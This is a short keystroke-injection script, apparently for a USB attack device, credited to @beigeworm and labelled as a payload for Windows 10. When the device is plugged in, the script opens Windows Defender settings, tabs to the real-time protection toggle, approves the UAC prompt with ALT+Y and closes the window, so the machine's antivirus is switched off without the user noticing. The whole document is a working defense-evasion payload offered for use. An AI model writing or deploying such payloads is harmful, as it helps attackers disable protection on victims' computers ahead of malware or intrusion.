// =============================================================================
// Title: Disable Real-Time Protection via GUI
// Author: @beigeworm | https://github.com/beigeworm
// Description: Disable Real-Time Protection via the Windows Defender GUI.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(2500);
type("C:\\Windows\\explorer.exe windowsdefender:");
delay(500);
press("ENTER");
delay(7000);
press("ENTER");
delay(2000);
press("TAB");
delay(300);
press("TAB");
delay(300);
press("TAB");
delay(300);
press("TAB");
delay(300);
press("ENTER");
delay(2500);
press("ALT y");
delay(3000);
press("ALT F4");